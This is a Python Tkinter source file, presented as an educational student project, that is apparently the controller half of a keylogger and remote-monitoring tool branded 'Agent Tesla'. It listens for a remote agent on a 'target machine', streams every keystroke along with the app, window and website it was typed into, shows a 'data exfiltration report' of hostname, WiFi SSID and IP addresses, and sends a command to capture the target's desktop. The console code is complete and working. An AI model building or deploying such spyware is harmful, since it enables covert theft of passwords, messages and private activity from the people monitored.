"""
=============================================================
  USER DASHBOARD  (Script B)
  Educational System Monitoring Demo – FYP Project

  Shows IN REAL TIME from the agent machine:
    • Every keystroke + the app/window it was typed in
    • Context category (Browser / Terminal / Editor / etc.)
    • Live CPU, RAM, Disk, Network, Process count
    • Per-app keystroke frequency stats
    • Session timeline log

  USAGE:
    1. python user_dashboard.py   ← run this FIRST
    2. Then start host_agent.py on the target machine
=============================================================
"""

import socket
import io
import base64
from PIL import Image
import json
import threading
import time
import tkinter as tk
from tkinter import ttk, scrolledtext,messagebox
from collections import defaultdict


LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 9999

# ── Context colour map ───────────────────────────────────────
CONTEXT_COLORS = {
    "Browser":     "#38b6ff",
    "Code Editor": "#a29bfe",
    "Office":      "#55efc4",
    "Terminal":    "#fd79a8",
    "Messaging":   "#fdcb6e",
    "Text Editor": "#74b9ff",
    "App":         "#b2bec3",
}

# ── Palette ──────────────────────────────────────────────────
BG      = "#0d0f18"
PANEL   = "#13162a"
BORDER  = "#1e2240"
GREEN   = "#00e5a0"
RED     = "#ff4f6d"
YELLOW  = "#ffd166"
BLUE    = "#38b6ff"
PURPLE  = "#a29bfe"
WHITE   = "#e8eaf6"
DIM     = "#4a5080"
FONT_MONO = ("Courier New", 10)
FONT_UI   = ("Segoe UI", 10)
FONT_BIG  = ("Segoe UI", 11, "bold")


class Dashboard(tk.Tk):

    def __init__(self):
        super().__init__()
        self.title("Agent Tesla")
        self.geometry("1180x740")
        self.minsize(960, 640)
        self.configure(bg=BG)

        self._conn       = None
        self._srv_sock   = None
        self._running    = True

        # Stats
        self._app_counts    = defaultdict(int)   # per-app keystroke count
        self._session_keys  = 0
        self._current_app   = "—"
        self._current_title = "—"
        self._current_ctx   = "App"
        self._prev_sent = 0
        self._prev_recv = 0
        self._target_sys_info = None

        self._build_ui()
        self._start_server()
        self.protocol("WM_DELETE_WINDOW", self._on_close)

    # ════════════════════════════════════════════════════════
    #  UI
    # ════════════════════════════════════════════════════════
    def _build_ui(self):
        self._style_ttk()

        # ── Title bar ────────────────────────────────────────
        top = tk.Frame(self, bg="#090b14", pady=0)
        top.pack(fill="x")
        tk.Canvas(top, bg="#090b14", height=3, bd=0, highlightthickness=0,
                  ).pack(fill="x")
        inner_top = tk.Frame(top, bg="#090b14")
        inner_top.pack(fill="x", padx=16, pady=10)

        tk.Label(inner_top, text=" Agent Tesla", font=("Courier New", 16, "bold"),
                 fg=GREEN, bg="#090b14").pack(side="left")
        tk.Label(inner_top, text="3.2.8.4 |  English (US)",
                 font=("Segoe UI", 10), fg=DIM, bg="#090b14").pack(side="left", padx=14)

        self.lbl_conn = tk.Label(inner_top, text="● OFFLINE",
                                 font=("Segoe UI", 10, "bold"), fg=RED, bg="#090b14")
        self.lbl_conn.pack(side="right")
        self.lbl_agent_ip = tk.Label(inner_top, text="",
                                     font=FONT_UI, fg=DIM, bg="#090b14")
        self.lbl_agent_ip.pack(side="right", padx=10)

        # --- TARGET PROFILE BUTTON ---
        tk.Button(inner_top, text="⬡ TARGET PROFILE", font=("Segoe UI", 9, "bold"),
                  bg="#a29bfe", fg="#090b14", relief="flat", padx=10, pady=2, cursor="hand2",
                  command=self._show_target_profile).pack(side="right", padx=10)
        # ----------------------------------

        # Thin accent line
        tk.Frame(self, bg=GREEN, height=2).pack(fill="x")

        # ── Body ─────────────────────────────────────────────
        body = tk.Frame(self, bg=BG)
        body.pack(fill="both", expand=True, padx=12, pady=10)

        # Left column (stats)
        left = tk.Frame(body, bg=BG, width=290)
        left.pack(side="left", fill="y", padx=(0, 10))
        left.pack_propagate(False)

        self._build_stats_panel(left)
        self._build_context_panel(left)
        self._build_app_freq_panel(left)

        # Right column (keystroke log + timeline)
        right = tk.Frame(body, bg=BG)
        right.pack(side="left", fill="both", expand=True)

        self._build_active_window_bar(right)
        self._build_keystroke_panel(right)
        self._build_timeline_panel(right)

        # ── Status bar ───────────────────────────────────────
        bar = tk.Frame(self, bg="#090b14", pady=5)
        bar.pack(fill="x", side="bottom")
        self.lbl_status = tk.Label(bar, text=f"Listening on port {LISTEN_PORT} …",
                                   font=("Segoe UI", 9), fg=DIM, bg="#090b14")
        self.lbl_status.pack(side="left", padx=14)
        self.lbl_session = tk.Label(bar, text="Keystrokes this session: 0",
                                    font=("Segoe UI", 9), fg=DIM, bg="#090b14")
        self.lbl_session.pack(side="right", padx=14)

    def _style_ttk(self):
        # Initialize the style object linked to this instance
        s = ttk.Style(self)
        
        # Use 'clam' as it is the most reliable theme for custom coloring
        s.theme_use("clam") 
        
        # Standard Green Style
        s.configure("TProgressbar", 
                    troughcolor="#1e2240", 
                    background="#00e5a0",
                    bordercolor="#1e2240", 
                    lightcolor="#00e5a0", 
                    darkcolor="#00e5a0")
        
        # Yellow Style
        s.configure("Yellow.Horizontal.TProgressbar",
                    troughcolor="#1e2240",
                    background="#ffd166",
                    bordercolor="#1e2240",
                    lightcolor="#ffd166",
                    darkcolor="#ffd166")

        # Red Style
        s.configure("Red.Horizontal.TProgressbar",
                    troughcolor="#1e2240",
                    background="#ff4f6d",
                    bordercolor="#1e2240",
                    lightcolor="#ff4f6d",
                    darkcolor="#ff4f6d")

    # ── Stats panel ──────────────────────────────────────────
    def _build_stats_panel(self, parent):
        f = self._panel(parent, "⬡  System Stats")
        f.pack(fill="x", pady=(0, 8))

        def row(label, color=GREEN):
            r = tk.Frame(f, bg=PANEL)
            r.pack(fill="x", padx=10, pady=2)
            tk.Label(r, text=label, font=("Segoe UI", 9), fg=DIM,
                     bg=PANEL, width=16, anchor="w").pack(side="left")
            v = tk.Label(r, text="—", font=("Courier New", 10, "bold"),
                         fg=color, bg=PANEL, anchor="w")
            v.pack(side="left")
            return v

        self.lbl_cpu      = row("CPU")
        self.bar_cpu      = self._bar(f, "TProgressbar")
        self.lbl_ram      = row("RAM")
        self.bar_ram      = self._bar(f, "TProgressbar")
        self.lbl_disk     = row("Disk", YELLOW)
        self.bar_disk = self._bar(f, "Yellow.Horizontal.TProgressbar")
        self.lbl_net_up   = row("Net ↑", BLUE)
        self.lbl_net_dn   = row("Net ↓", PURPLE)
        self.lbl_procs    = row("Processes", WHITE)
        self.lbl_platform = row("Platform", DIM)
        tk.Frame(f, bg=PANEL, height=6).pack()

    def _bar(self, parent, style):
        bar = ttk.Progressbar(parent, orient="horizontal", length=260,
                              mode="determinate", style=style, maximum=100)
        bar.pack(padx=10, pady=(0, 4))
        return bar

    # ── Current context panel ─────────────────────────────────
    def _build_context_panel(self, parent):
        f = self._panel(parent, "⬡  Active Context")
        f.pack(fill="x", pady=(0, 8))

        self.lbl_ctx_badge = tk.Label(f, text="App", font=("Courier New", 11, "bold"),
                                      fg=BG, bg=DIM, padx=10, pady=4)
        self.lbl_ctx_badge.pack(padx=10, pady=(6, 2), anchor="w")

        self.lbl_ctx_app = tk.Label(f, text="App: —", font=("Segoe UI", 9),
                                    fg=WHITE, bg=PANEL, anchor="w", wraplength=250)
        self.lbl_ctx_app.pack(padx=10, pady=1, anchor="w")

        self.lbl_ctx_title = tk.Label(f, text="Window: —", font=("Segoe UI", 9),
                                      fg=DIM, bg=PANEL, anchor="w", wraplength=250)
        self.lbl_ctx_title.pack(padx=10, pady=(1, 8), anchor="w")

    # ── App frequency panel ───────────────────────────────────
    def _build_app_freq_panel(self, parent):
        f = self._panel(parent, "⬡  App Keystroke Count")
        f.pack(fill="both", expand=True)

        self.freq_list = tk.Text(f, font=("Courier New", 9), bg=PANEL, fg=WHITE,
                                 bd=0, relief="flat", state="disabled",
                                 height=8, cursor="arrow")
        self.freq_list.pack(fill="both", expand=True, padx=6, pady=6)
        self.freq_list.tag_config("app",   foreground=GREEN)
        self.freq_list.tag_config("count", foreground=YELLOW)
        self.freq_list.tag_config("bar",   foreground=BORDER)

    # ── Active window banner ─────────────────────────────────
    """
    def _build_active_window_bar(self, parent):
        self.window_bar = tk.Frame(parent, bg=BORDER, padx=12, pady=8)
        self.window_bar.pack(fill="x", pady=(0, 8))
        self.lbl_win_ctx = tk.Label(self.window_bar, text="Browser",
                                    font=("Courier New", 10, "bold"),
                                    fg=BG, bg=BLUE, padx=8, pady=2)
        self.lbl_win_ctx.pack(side="left")
        self.lbl_win_app = tk.Label(self.window_bar, text="—",
                                    font=("Segoe UI", 10, "bold"),
                                    fg=WHITE, bg=BORDER)
        self.lbl_win_app.pack(side="left", padx=10)
        self.lbl_win_title = tk.Label(self.window_bar, text="—",
                                      font=("Segoe UI", 9), fg=DIM, bg=BORDER)
        self.lbl_win_title.pack(side="left")
    """
    def _build_active_window_bar(self, parent):
        self.window_bar = tk.Frame(parent, bg=BORDER, padx=12, pady=8)
        self.window_bar.pack(fill="x", pady=(0, 8))
        self.lbl_win_ctx = tk.Label(self.window_bar, text="Browser",
                                    font=("Courier New", 10, "bold"),
                                    fg=BG, bg=BLUE, padx=8, pady=2)
        self.lbl_win_ctx.pack(side="left")
        
        self.lbl_win_app = tk.Label(self.window_bar, text="—",
                                    font=("Segoe UI", 10, "bold"),
                                    fg=WHITE, bg=BORDER)
        self.lbl_win_app.pack(side="left", padx=10)

        # NEW: The Website Label (Highlighted in Yellow)
        self.lbl_win_web = tk.Label(self.window_bar, text="",
                                    font=("Segoe UI", 10, "bold"),
                                    fg=YELLOW, bg=BORDER)
        self.lbl_win_web.pack(side="left", padx=(0, 10))

        self.lbl_win_title = tk.Label(self.window_bar, text="—",
                                      font=("Segoe UI", 9), fg=DIM, bg=BORDER)
        self.lbl_win_title.pack(side="left")

    # ── Keystroke stream panel ───────────────────────────────
    def _build_keystroke_panel(self, parent):
        f = self._panel(parent, "⬡  Live Keystroke Stream")
        f.pack(fill="both", expand=True, pady=(0, 8))

        # Key display area
        self.key_canvas = tk.Frame(f, bg="#0a0c18")
        self.key_canvas.pack(fill="both", expand=True, padx=6, pady=6)

        self.key_text = scrolledtext.ScrolledText(
            self.key_canvas, font=("Courier New", 13), bg="#0a0c18",
            fg=GREEN, insertbackground=GREEN, bd=0, relief="flat",
            wrap="word", cursor="arrow")
        self.key_text.pack(fill="both", expand=True)
        self.key_text.config(state="disabled")

        # Tags for context colours
        for ctx, col in CONTEXT_COLORS.items():
            self.key_text.tag_config(ctx, foreground=col)
        self.key_text.tag_config("special", foreground=YELLOW,
                                 font=("Courier New", 10))

        btn_row = tk.Frame(f, bg=PANEL)
        btn_row.pack(fill="x", padx=6, pady=(0, 6))
        tk.Button(btn_row, text="Clear", font=("Segoe UI", 9),
                  bg=BORDER, fg=WHITE, relief="flat", padx=8,
                  command=self._clear_keylog).pack(side="right")

    # ── Timeline panel ───────────────────────────────────────
    def _build_timeline_panel(self, parent):
        f = self._panel(parent, "⬡  Session Event Log")
        f.pack(fill="x")

        self.timeline = scrolledtext.ScrolledText(
            f, font=("Courier New", 9), bg=PANEL, fg=DIM,
            bd=0, relief="flat", height=6, cursor="arrow", wrap="none")
        self.timeline.pack(fill="x", padx=6, pady=6)
        self.timeline.config(state="disabled")
        self.timeline.tag_config("ts",      foreground=DIM)
        self.timeline.tag_config("app",     foreground=GREEN)
        self.timeline.tag_config("special", foreground=YELLOW)
        self.timeline.tag_config("connect", foreground=GREEN, font=("Courier New", 9, "bold"))
        self.timeline.tag_config("discon",  foreground=RED,   font=("Courier New", 9, "bold"))

    # ── Panel helper ─────────────────────────────────────────
    def _panel(self, parent, title):
        wrap = tk.Frame(parent, bg=PANEL, bd=1, relief="flat",
                        highlightbackground=BORDER, highlightthickness=1)
        tk.Label(wrap, text=title, font=("Courier New", 9, "bold"),
                 fg=DIM, bg=PANEL, anchor="w", pady=4).pack(fill="x", padx=8)
        tk.Frame(wrap, bg=BORDER, height=1).pack(fill="x")
        return wrap

    # ════════════════════════════════════════════════════════
    #  SERVER / NETWORK
    # ════════════════════════════════════════════════════════
    def _start_server(self):
        threading.Thread(target=self._server_loop, daemon=True).start()

    def _server_loop(self):
        self._srv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._srv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._srv_sock.bind((LISTEN_HOST, LISTEN_PORT))
        self._srv_sock.listen(1)
        print(f"[Dashboard] Listening on {LISTEN_HOST}:{LISTEN_PORT}")

        while self._running:
            try:
                conn, addr = self._srv_sock.accept()
                self._conn = conn
                self.after(0, self._on_connect, addr)
                self._recv_loop(conn, addr)
            except OSError:
                break

    def _recv_loop(self, conn, addr):
        buf = ""
        try:
            while self._running:
                chunk = conn.recv(4096).decode("utf-8")
                if not chunk:
                    break
                buf += chunk
                while "\n" in buf:
                    line, buf = buf.split("\n", 1)
                    line = line.strip()
                    if line:
                        try:
                            pkt = json.loads(line)
                            self.after(0, self._route, pkt)
                        except json.JSONDecodeError:
                            pass
        except OSError:
            pass
        finally:
            conn.close()
            self._conn = None
            self.after(0, self._on_disconnect)

    def _route(self, pkt):
        t = pkt.get("type")
        if t == "sys_stats":
            self._update_stats(pkt["data"])
        elif t == "keystroke":
            self._handle_keystroke(pkt["data"])
        elif t == "sys_info":                   
            self._target_sys_info = pkt["data"] 
        elif t == "screenshot_resp":                  
            self._save_screenshot(pkt["data"])

    def _save_screenshot(self, b64_data):
        """Decodes the incoming screenshot and saves it to disk"""
        try:
            # 1. Decode the base64 text back into raw bytes
            img_data = base64.b64decode(b64_data)
            
            # 2. Open it as an Image
            img = Image.open(io.BytesIO(img_data))
            
            # 3. Create a unique filename using the current time
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"target_desktop_{timestamp}.png"
            
            # 4. Save it to the same folder where your dashboard script is
            img.save(filename)
            
            self._log_timeline(f"[{time.strftime('%H:%M:%S')}] 📷 Screenshot saved as {filename}", "special")
            messagebox.showinfo("Screenshot Captured", f"Successfully captured and saved as:\n{filename}")
            
        except Exception as e:
            messagebox.showerror("Screenshot Error", f"Failed to process screenshot:\n{e}")
    # ════════════════════════════════════════════════════════
    #  UI UPDATERS
    # ════════════════════════════════════════════════════════
    def _on_connect(self, addr):
        self.lbl_conn.config(text="● LIVE", fg=GREEN)
        self.lbl_agent_ip.config(text=f"Agent: {addr[0]}:{addr[1]}")
        self.lbl_status.config(text=f"Connected from {addr[0]}:{addr[1]}")
        self._log_timeline(f"[{time.strftime('%H:%M:%S')}] Agent connected from {addr[0]}", "connect")

    def _on_disconnect(self):
        self.lbl_conn.config(text="● OFFLINE", fg=RED)
        self.lbl_agent_ip.config(text="")
        self.lbl_status.config(text="Agent disconnected. Waiting …")
        self._log_timeline(f"[{time.strftime('%H:%M:%S')}] Agent disconnected", "discon")

    def _update_stats(self, d):
        cpu = d.get("cpu_percent", 0)
        ram = d.get("ram_percent", 0)
        disk = d.get("disk_percent", 0)

        cpu_col = RED if cpu > 80 else YELLOW if cpu > 50 else GREEN
        self.lbl_cpu.config(
            text=f"{cpu:.1f}%  [{d.get('proc_count','?')} procs]", fg=cpu_col)
        self.bar_cpu["value"] = cpu

        self.lbl_ram.config(
            text=f"{ram:.1f}%  ({d.get('ram_used_mb',0):.0f} / {d.get('ram_total_mb',0):.0f} MB)",
            fg=RED if ram > 85 else GREEN)
        self.bar_ram["value"] = ram

        self.lbl_disk.config(
            text=f"{disk:.1f}%  ({d.get('disk_used_gb',0):.1f} / {d.get('disk_total_gb',0):.1f} GB)")
        self.bar_disk["value"] = disk

        self.lbl_net_up.config(text=self._fmt(d.get("net_sent_ps", 0)) + "/s")
        self.lbl_net_dn.config(text=self._fmt(d.get("net_recv_ps", 0)) + "/s")
        self.lbl_procs.config(text=str(d.get("proc_count", "—")))
        self.lbl_platform.config(text=d.get("platform", "—"))

    def _handle_keystroke(self, d):
        key      = d.get("key", "")
        key_type = d.get("key_type", "char")
        app      = d.get("app", "Unknown")
        title    = d.get("title", "—")
        context  = d.get("context", "App")
        website  = d.get("website", "—")  # NEW: Extract website from payload
        ts       = d.get("ts", "")

        # Session counter
        self._session_keys += 1
        self.lbl_session.config(text=f"Keystrokes this session: {self._session_keys}")

        # App frequency
        self._app_counts[app] += 1
        self._refresh_freq_panel()

        # Update active context if changed (Added title check for browser tab switching!)
        if app != self._current_app or title != self._current_title or context != self._current_ctx:
            self._current_app   = app
            self._current_title = title
            self._current_ctx   = context
            col = CONTEXT_COLORS.get(context, DIM)

            self.lbl_ctx_badge.config(text=context, bg=col)
            self.lbl_ctx_app.config(text=f"App:    {app}")
            self.lbl_ctx_title.config(text=f"Window: {title}")

            self.lbl_win_ctx.config(text=context, bg=col)
            self.lbl_win_app.config(text=app)

            # NEW: Display the website if in a browser, otherwise hide it
            if context == "Browser" and website != "—":
                self.lbl_win_web.config(text=f"[{website}]")
            else:
                self.lbl_win_web.config(text="")

            self.lbl_win_title.config(text=title[:60] + "…" if len(title) > 60 else title)

            # Timeline entry for app switch (Now includes website name)
            if context == "Browser":
                self._log_timeline(f"[{ts}] ▶ {context}  {app} [{website}] — {title[:40]}", "app")
            else:
                self._log_timeline(f"[{ts}] ▶ {context}  {app}  —  {title[:50]}", "app")

        # Append key to stream
        self.key_text.config(state="normal")
        if key_type == "special":
            display = f"[{key}]"
            self.key_text.insert("end", display, "special")
        else:
            self.key_text.insert("end", key, context)
        self.key_text.see("end")
        self.key_text.config(state="disabled")
        
    def _refresh_freq_panel(self):
        sorted_apps = sorted(self._app_counts.items(), key=lambda x: x[1], reverse=True)
        total = max(sum(v for _, v in sorted_apps), 1)

        self.freq_list.config(state="normal")
        self.freq_list.delete("1.0", "end")
        for app, count in sorted_apps[:10]:
            bar_len = int((count / total) * 20)
            bar_str = "█" * bar_len + "░" * (20 - bar_len)
            short   = (app[:18] + "…") if len(app) > 18 else app
            line    = f" {short:<20}  "
            self.freq_list.insert("end", line, "app")
            self.freq_list.insert("end", bar_str + f"  {count}\n", "count")
        self.freq_list.config(state="disabled")

    def _log_timeline(self, msg, tag=""):
        self.timeline.config(state="normal")
        self.timeline.insert("end", msg + "\n", tag)
        self.timeline.see("end")
        self.timeline.config(state="disabled")

    def _clear_keylog(self):
        self.key_text.config(state="normal")
        self.key_text.delete("1.0", "end")
        self.key_text.config(state="disabled")

    @staticmethod
    def _fmt(b):
        if b < 1024:      return f"{b} B"
        if b < 1024**2:   return f"{b/1024:.1f} KB"
        return f"{b/1024**2:.2f} MB"
    
    def _show_target_profile(self):
        """Creates the Data Exfiltration / Target Profile popup window"""
        if not self._target_sys_info:
            messagebox.showinfo("No Data", "Target profile has not been exfiltrated yet. Ensure agent is connected.")
            return

        # Create Popup Window
        win = tk.Toplevel(self)
        win.title("Target System Profile")
        win.geometry("450x550")
        win.configure(bg=BG)
        win.transient(self) # Keep on top of main window
        
        tk.Label(win, text="⬢ DATA EXFILTRATION REPORT", font=("Courier New", 14, "bold"), 
                 fg=RED, bg=BG).pack(pady=(20, 10))
                 
        # Content Frame
        f = tk.Frame(win, bg=PANEL, bd=1, highlightbackground=BORDER, highlightthickness=1)
        f.pack(fill="both", expand=True, padx=20, pady=10)
        
        # Helper to draw rows
        def add_row(parent, label, value, color=WHITE):
            row = tk.Frame(parent, bg=PANEL)
            row.pack(fill="x", padx=15, pady=8)
            tk.Label(row, text=label, font=("Segoe UI", 10, "bold"), fg=DIM, bg=PANEL).pack(side="left")
            tk.Label(row, text=value, font=("Courier New", 10), fg=color, bg=PANEL).pack(side="right")
            tk.Frame(parent, bg=BORDER, height=1).pack(fill="x", padx=10)

        data = self._target_sys_info
        
        # System Info
        tk.Label(f, text="--- SYSTEM ---", font=("Courier New", 10, "bold"), fg=PURPLE, bg=PANEL).pack(anchor="w", padx=15, pady=(15, 5))
        add_row(f, "Hostname:", data.get("hostname", "Unknown"), BLUE)
        add_row(f, "Operating System:", data.get("os", "Unknown"))
        add_row(f, "Processor:", data.get("processor", "Unknown")[:30] + "...")
        add_row(f, "System Boot Time:", data.get("boot_time", "Unknown"), YELLOW)
        
        # Network Info
        tk.Label(f, text="--- NETWORK ---", font=("Courier New", 10, "bold"), fg=PURPLE, bg=PANEL).pack(anchor="w", padx=15, pady=(15, 5))
        add_row(f, "Active WiFi SSID:", data.get("wifi_ssid", "Unknown"), GREEN)
        
        # List all Network Interfaces
        if "interfaces" in data:
            for iface, ip in data["interfaces"].items():
                iface_short = (iface[:15] + "..") if len(iface) > 15 else iface
                add_row(f, f"IP ({iface_short}):", ip, WHITE)
        # --- NEW: SCREENSHOT BUTTON ---
        def request_screenshot():
            if self._conn:
                try:
                    self._conn.sendall(b"CMD:SCREENSHOT")
                    messagebox.showinfo("Command Sent", "Screenshot command sent to agent. Please wait a moment...", parent=win)
                except Exception as e:
                    messagebox.showerror("Error", "Lost connection to agent.", parent=win)
            else:
                messagebox.showerror("Error", "Agent is not connected.", parent=win)

        tk.Button(f, text="📷 CAPTURE TARGET DESKTOP", font=("Segoe UI", 9, "bold"), 
                  bg=RED, fg=BG, relief="flat", pady=5, cursor="hand2", 
                  command=request_screenshot).pack(fill="x", padx=15, pady=10)
        # ------------------------------
        # Close Button
        tk.Button(win, text="CLOSE REPORT", font=("Segoe UI", 10, "bold"), bg=BORDER, fg=WHITE, 
                  relief="flat", command=win.destroy).pack(pady=15)

    def _on_close(self):
        self._running = False
        try:
            self._srv_sock.close()
        except Exception:
            pass
        self.destroy()


if __name__ == "__main__":
    app = Dashboard()
    app.mainloop()